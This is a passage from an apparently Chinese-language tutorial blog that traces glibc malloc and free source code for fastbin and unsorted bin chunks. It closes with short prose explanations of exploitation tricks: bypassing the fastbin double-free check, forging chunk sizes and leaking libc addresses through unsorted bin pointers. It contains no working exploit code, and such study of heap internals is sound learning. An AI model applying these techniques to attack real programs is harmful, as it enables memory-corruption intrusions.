      idx &#x3D; smallbin_index (nb);          else            idx &#x3D; largebin_index (nb);        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空，调用sysmalloc直接向系统申请内存</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else        &#123;          void *p &#x3D; sysmalloc (nb, av);          if (p !&#x3D; NULL)            alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h2 id="free到fastbin"><a href="#free到fastbin" class="headerlink" title="free到fastbin"></a>free到fastbin</h2><h3 id="源程序-1"><a href="#源程序-1" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-1"><a href="#运行过程-1" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>由源码中<code>strong_alias (__libc_free, free)</code>得出：<code>free</code>就是<code>__libc_free</code>的别名</p></li><li><p>调用<code>__libc_free</code>函数，传入的参数<code>*mem</code>是要释放的堆的<code>user data</code>地址的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __libc_free(void *mem)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>__free_hook</code>中的函数来完成释放，默认值为0，没有初始化的过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void (*hook) (void *, const void *)    &#x3D; atomic_forced_read (__free_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    &#123;      (*hook)(mem, RETURN_ADDRESS (0));      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断传入的指针值是否为0，free（0）无效</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (mem &#x3D;&#x3D; 0)                              &#x2F;* free(0) has no effect *&#x2F;    return;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>mem2chunk</code>函数，将<code>user data</code>的指针<code>mem</code>转换为对应的<code>chunk head</code>指针<code>p</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;mem2chunk函数宏定义&#x2F;&#x2F;chunk head与user data之间相差prev_size和size字段，分别占一个机器字节，因此从user data到chunlk head只需减去两个机器字长，即2*SIZE_SZ#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">p &#x3D; mem2chunk (mem);&#x2F;&#x2F;p指向chunk head<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>chunk_is_mmapped</code>函数判断该chunk是否由<code>mmap</code>分配</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunk_is_mmapped宏定义&#x2F;&#x2F;检查size最低三位中的标志位，若为2则是mmap分配的内存#define IS_MMAPPED 0x2#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>补充</strong>：使用<code>malloc</code> 、<code>free</code> 等函数动态申请和释放内存时真正与系统交互用于系统调用的函数主要是 <code>(s)brk</code> 函数以及 <code>mmap</code></p><ul><li><code>brk</code>用于分配小空间，将数据段(.data)的最高地址指针<code>_edata</code>往高地址推</li><li><code>mmap</code>用于分配大空间，是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</li><li>这两种方式分配的都是虚拟内存，没有分配物理内存</li></ul><p>源程序中释放的堆不是由<code>mmap</code>分配的因此跳过<code>if</code>中的内容</p></li><li><p>调用<code>arena_for_chunk</code>获取该<code>chunk</code>的分配区指针<code>ar_ptr</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ar_ptr &#x3D; arena_for_chunk (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>_int_free</code>函数释放堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_int_free (ar_ptr, p, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;_int_free函数定义，参数中的mstate表示的是malloc_state结构体也就是main_arena的结构体，mchunkptr表示的是malloc_chunk的结构体，av指向该chunk的分配区，p指向该chunk的chunk headstatic void _int_free (mstate av, mchunkptr p, int have_lock)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>chunksize</code>函数获取该<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunksize宏定义，取p所指向的chunk的size位#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查地址的合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;分配器永远不会在地址空间的末尾环绕，因此我们可以排除一些可能出现的尺寸值&#x2F;&#x2F;判断堆地址不在空间末尾且是对齐的，否则报无效地址的错误&#x2F;&#x2F;若互斥锁开启则关闭互斥锁if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr &#x3D; &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>检查大小合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;判断堆大小是大于最小值&#x2F;&#x2F;判断大小对齐，即是机器字长的整数倍数if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr &#x3D; &quot;free(): invalid size&quot;;      goto errout;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MINSIZE宏定义&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 两倍机器字长-1，结果将MIN_CHUNK_SIZE进行两倍机器字长对齐#define MINSIZE  \  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;aligned_OK宏定义，结果是判断是否是机器字长的整数倍#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) &#x3D;&#x3D; 0)&#x2F;&#x2F;MALLOC_ALIGN_MASK宏定义#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MIN_CHUNK_SIZE宏定义#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断堆是否在<code>fastbin</code>里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;大小小于等于fastbin最大值if ((unsigned long)(size) &lt;&#x3D; (unsigned long)(get_max_fast ())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查要释放的堆的下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;互斥锁是否开启&#x2F;&#x2F;下一个堆的大小是否小于最小堆大小或大于该内存池的user data最大值&#x2F;&#x2F;av指向chunk分配区if (have_lock    || (&#123; assert (locked &#x3D;&#x3D; 0);  mutex_lock(&amp;av-&gt;mutex);  locked &#x3D; 1;  chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ    || chunksize (chunk_at_offset (p, size)) &gt;&#x3D; av-&gt;system_mem;      &#125;))  &#123;    errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果互斥锁开启则关闭</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock)  &#123;    (void)mutex_unlock(&amp;av-&gt;mutex);    locked &#x3D; 0;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>清空堆中的内容</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;free_perturb函数定义&#x2F;&#x2F;p指向user data， n 为实际堆实际大小，即不含chunk head&#x2F;&#x2F;perturb：扰乱&#x2F;&#x2F;perturb_byte为0时，将堆的user data部分清空为0static voidfree_perturb (char *p, size_t n)&#123;  if (__glibc_unlikely (perturb_byte))    memset (p, perturb_byte, n);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置分配区的标志位表示<code>fastbin</code>有空闲<code>chunk</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;av的标志位设置为1set_fastchunks(av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;set_fastchunks宏定义#define set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)&#x2F;&#x2F;FASTCHUNKS_BIT宏定义#define FASTCHUNKS_BIT        (1U)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fastbin_index宏定义#define fastbin_index宏定义(sz) \  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ &#x3D;&#x3D; 8 ? 4 : 3)) - 2)   &#x2F;&#x2F;SIZE_SZ等于一个机器字长，32位右移1，64位右移2（除）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fb指向chunk大小所在的fastbin链的头指针unsigned int idx &#x3D; fastbin_index(size);fb &#x3D; &amp;fastbin (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查<code>double free</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将<code>chunk</code>添加到顶部之后检查顶部的 <code>fastbin </code>块的大小是否与我们要添加的块的大小相同。只有在我们拥有锁的情况下，我们才能解除对<code> OLD</code> 的引用</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;检查互斥锁&#x2F;&#x2F;old_idx为头结点所在的fastbin链的下标&#x2F;&#x2F;该chunk添加到fastbin中，即将fd设置为原来的头结点，并且把该chunk设置为头指针&#x2F;&#x2F;idx和old_idx不相等的时候报错if (have_lock &amp;&amp; old !&#x3D; NULL)  old_idx &#x3D; fastbin_index(chunksize(old));p-&gt;fd &#x3D; old2 &#x3D; old;      &#125;    while ((old &#x3D; catomic_compare_and_exchange_val_rel (fb, p, old2)) !&#x3D; old2);    if (have_lock &amp;&amp; old !&#x3D; NULL &amp;&amp; __builtin_expect (old_idx !&#x3D; idx, 0))      &#123;errstr &#x3D; &quot;invalid fastbin entry (free)&quot;;goto errout;      &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从fastbin取出chunk"><a href="#从fastbin取出chunk" class="headerlink" title="从fastbin取出chunk"></a>从fastbin取出chunk</h2><h3 id="源程序-2"><a href="#源程序-2" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-2"><a href="#运行过程-2" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断申请实际大小所在的<code>fastbin</code>链表的第一个结点是否为空</p></li><li><p>第一个结点不为空，则更改链表头指向第二个结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do       &#123;         victim &#x3D; pp;         if (victim &#x3D;&#x3D; NULL)           break;       &#125;     while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))            !&#x3D; victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>判断所取到的堆的大小所在<code>fastbin</code>的下标与申请的实际大小应该在的下标是否一致</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>计算并返回从fastbin获取的chunk的user data起始地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="fastbin相关漏洞和绕过利用原理"><a href="#fastbin相关漏洞和绕过利用原理" class="headerlink" title="fastbin相关漏洞和绕过利用原理"></a>fastbin相关漏洞和绕过利用原理</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>在<a href="#free%E5%88%B0fastbin">free到fastbin</a>中有对<code>double free</code>的判断机制</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>原理：</strong>连续两次释放同一个堆</p><p><strong>利用：</strong>判断要释放的堆所属的<code>fastbin</code>链的第一个<code>chunk</code>地址是否和要释放的堆的地址相同，若相同则判定为<code>double free</code>，因此绕过只需要保证二者地址不同即可，所以绕过方法是在第二次释放之前先释放一个属于这个链的堆使得第一个地址不是实际要释放的地址，第二次释放需要释放的地址时链表第一个地址就是两次释放之间释放的堆的地址，不会触发<code>double free</code>的报错。</p><h3 id="绕过对取出的堆的大小检查"><a href="#绕过对取出的堆的大小检查" class="headerlink" title="绕过对取出的堆的大小检查"></a>绕过对取出的堆的大小检查</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>find_fake_fast</code>工具寻找离所求地址最近的可以伪造<code>size</code>位符合要求的堆</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h2 id="free到unsorted-bin"><a href="#free到unsorted-bin" class="headerlink" title="free到unsorted bin"></a>free到unsorted bin</h2><h3 id="源程序-3"><a href="#源程序-3" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-3"><a href="#运行过程-3" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#free%E5%88%B0fastbin">free到fastbin</a>的判断堆是否在<code>fastbin</code>里</p></li><li><p>不在<code>fastbin</code>之后判断是否是<code>mmap</code>分配的，不是则继续运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (!chunk_is_mmapped(p)) &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果没有互斥锁则加锁</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked &#x3D; 1;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获得下一个<code>chunk</code>的大小和指针到<code>p</code>和<code>size</code>，即<code>p</code>指向下一个<code>chunk</code>的地址，<code>size</code>为下一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextchunk &#x3D; chunk_at_offset(p, size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查该地址是否在分配区顶部，是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (p &#x3D;&#x3D; av-&gt;top))      &#123;errstr &#x3D; &quot;double free or corruption (top)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>av</code>为堆所在的分配区地址</p></li><li><p>判断下一个堆是否超出分配区的范围，判断方式：判断下一个堆的地址是否大于等于<code>av-&gt;top</code>加上<code>av-&gt;top</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (contiguous (av)  &amp;&amp; (char *) nextchunk  &gt;&#x3D; ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))     &#123;errstr &#x3D; &quot;double free or corruption (out)&quot;;goto errout;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断要释放的堆是否在<code>inuse</code>状态，判断方式：获取下一个堆的<code>prev_inuse</code>值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;errstr &#x3D; &quot;double free or corruption (!prev)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取下一个堆的大小并且判断下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextsize &#x3D; chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)|| __builtin_expect (nextsize &gt;&#x3D; av-&gt;system_mem, 0))      &#123;errstr &#x3D; &quot;free(): invalid next size (normal)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>清空堆中的内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断前一个堆是否被释放，如果被释放了则和前一个堆合并：获取前一个堆的大小，加到当前要释放的堆的<code>size</code>，并通过<a href="#unlink">unlink</a>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;      prevsize &#x3D; p-&gt;prev_size;      size +&#x3D; prevsize;      p &#x3D; chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断下一个堆是否是<code>top chunk</code>,若是则与<code>top chunk</code>合并，<strong>结束释放过程</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;...&#125;else &#123;      size +&#x3D; nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top &#x3D; p;      check_chunk(av, p);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是，获取下一个堆的<code>inuse</code>位</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextinuse &#x3D; inuse_bit_at_offset(nextchunk, nextsize);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断下一个堆是否在使用，若已经被释放则合并到当前要释放的堆，并通过<code>unlink</code>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>若还在使用则将<code>prev_inuse</code>设为0表示当前堆已经被释放了</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#125; elseclear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取分配区中的<code>unsorted_bin</code>的第一个堆的地址到<code>bck</code>，获取头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks(av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查<code>fwd</code>的<code>bk</code>是否是<code>bck</code>，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#123;  errstr &#x3D; &quot;free(): corrupted unsorted chunks&quot;;  goto errout;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将堆连接到<code>unsorted bin</code>中，即将要释放的堆的<code>fd</code>改成<code>fwd</code>，<code>bk</code>改成<code>bck</code>，<code>bck</code>的<code>fd</code>和<code>fwd</code>的<code>bk</code>设置成<code>p</code>，将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为第一个，并且堆大小不在<code>smallbin</code>范围内时设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>为NULL</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">  p-&gt;fd &#x3D; fwd;     p-&gt;bk &#x3D; bck;     if (!in_smallbin_range(size))&#123;  p-&gt;fd_nextsize &#x3D; NULL;  p-&gt;bk_nextsize &#x3D; NULL;&#125;     bck-&gt;fd &#x3D; p;     fwd-&gt;bk &#x3D; p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从unsorted-bin取出chunk"><a href="#从unsorted-bin取出chunk" class="headerlink" title="从unsorted bin取出chunk"></a>从unsorted bin取出chunk</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-4"><a href="#运行过程-4" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的调用<code>malloc_consolidate </code>整理<code>fastbins</code></p></li><li><p>进入整理<code>unsorted bin</code>的大循环，一边整理一边查找合适的<code>chunk</code>，找到即返回，结束创建过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int iters &#x3D; 0;while ((victim &#x3D; unsorted_chunks (av)-&gt;bk) !&#x3D; unsorted_chunks (av))    bck &#x3D; victim-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结束条件：遍历整理完<code>unsorted bin</code>或整理次数超过10000 </p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define MAX_ITERS       10000          if (++iters &gt;&#x3D; MAX_ITERS)            break;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第二个堆并且进行大小检查</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; victim-&gt;bk;if (__builtin_expect (victim-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))  malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                   chunk2mem (victim), av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第一个<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>unsorted bin</code>的第一个<code>chunk</code>与所申请<code>chunk</code>精确匹配则直接返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take now instead of binning if exact fit *&#x2F;          if (size &#x3D;&#x3D; nb)            &#123;              set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;将匹配的的chunk设置为inuse              if (av !&#x3D; &amp;main_arena)                victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;若分配区非main_arena则设置为NON_MAIN_ARENA              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);&#x2F;&#x2F;返回堆的user data地址              alloc_perturb (p, bytes);              return p;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="unsorted-bin相关漏洞和绕过利用原理"><a href="#unsorted-bin相关漏洞和绕过利用原理" class="headerlink" title="unsorted bin相关漏洞和绕过利用原理"></a>unsorted bin相关漏洞和绕过利用原理</h2><h3 id="利用unsorted-bin泄露libc地址"><a href="#利用unsorted-bin泄露libc地址" class="headerlink" title="利用unsorted bin泄露libc地址"></a>利用unsorted bin泄露libc地址</h3><ul><li><p>释放一个堆到<code>unsorted bin</code>之后输出这个堆的<code>fd</code></p><ul><li>原理：将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为倒数第二个堆的过程中时<code>fwd = bck = main_arena  </code> ，连接之后被释放的堆的<code>fd</code>和<code>bk</code>均指向<code>main_arena</code></li></ul></li><li><p>两个相同大小的unsorted bin合并，申请一个相同大小的堆块，此时残留fd，可以泄露libc</p><ul><li><p>原理： 